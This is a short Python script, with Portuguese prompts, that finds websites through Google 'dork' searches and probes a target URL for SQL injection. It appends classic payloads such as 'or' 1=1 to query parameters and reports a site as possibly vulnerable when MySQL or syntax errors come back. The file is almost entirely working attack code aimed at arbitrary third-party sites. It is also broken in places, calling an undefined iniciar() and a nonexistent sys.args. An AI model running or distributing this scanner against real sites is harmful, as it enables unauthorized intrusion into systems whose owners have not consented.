import sys, urllib, urllib.request, hashlib, os, simplejson, urllib.parse, argparse

def buscaNoGoogle():
	global dork
	#dork = input("Digite a Dork de pesquisa: ")
	comeco = input("Digite a Pagina de busca: ")
	queryDaBusca = urllib.parse.urlencode({'q' : dork})
	url = 'http://ajax.googleapis.com/ajax/services/search/web?v=1.0&%s&start%s' % (queryDaBusca, int(comeco) * 10)
	resultadosDaBusca = urllib.request.urlopen(url, None, None)
	json = simplejson.loads(resultadosDaBusca.read())
	results = json['responseData']['results']
	for i in results:
		y = i['url']
		x = y.replace("%3F", "?")
		z = x.replace("%3D", "=")
		print (z)

	finalizar = input("\nDeseja Continuar?\n[0] Sair\n[1] Voltar p/ Menu\n")		 
	if finalizar == '0':
		sys.exit(1)
	elif finalizar == '1':
		os.system('reset')
		iniciar()

def principal():
		
		global urlcompleta

		if urlcompleta[:11] == "http://www.":
			urlcompleta = urlcompleta[11:]
		elif urlcompleta[:4] == "www.":
			urlcompleta = urlcompleta[4:]
		elif urlcompleta[:7] == "http://":
			urlcompleta = urlcompleta[7:]
	
		urlcompleta = "http://www.%s" % urlcompleta

		sqlvetor = ["\'", "\'or\' 1=1", "1\' or \'1\' = \'1\'"]
		#urlcompleta = input("\033[01;37mSite: \033[0m")
		
		procuraHttp = urlcompleta.find('http' or 'https')
		if procuraHttp < 0:
			print ("\033[01;31m\n[ERRO] O Site deve conter http:// \033[0m\n\n")
		else:
			print ("")		
		
		retorno = urlcompleta.find('=')
		corte = urlcompleta[:retorno + 1]

		urlVetor = [str(corte), str(urlcompleta)] 
		
		for i in range(3):
			for j in range(2):
				stringSql = urlVetor[j] + sqlvetor[i]
				print (stringSql)

				x = urllib.request.urlopen(stringSql)
				y = x.read()
				z = y.decode('iso-8859-1' or 'utf-8')

				if (("Warning") in z) or (("MySQL") in z) or (("syntax") in z): 
					print ("\033[01;37m[V] Possivelmente Vulneravel...\033[0m\n")
				else:
					print ("\033[01;31m[X] Não Vulneravel...\033[0m\n")

		continuar = input("Deseja Finalizar? \n[1]Voltar p/ Menu\n[2]Finalizar\n\n")
		if continuar == '1':
			os.system('reset')
			iniciar()
		elif continuar == '2':
			sys.exit(1)
		else:
			print ("Opção Invalida!")


parser = argparse.ArgumentParser(description = "Teste", add_help = False)

parser.add_argument("-u", "--url",
		help = "Informa site alvo")
parser.add_argument("-g", "--google", 
		help = "Informa a Dork de pesquisa")

args = parser.parse_args()

dork = args.google
urlcompleta = args.url

print (len(sys.args))


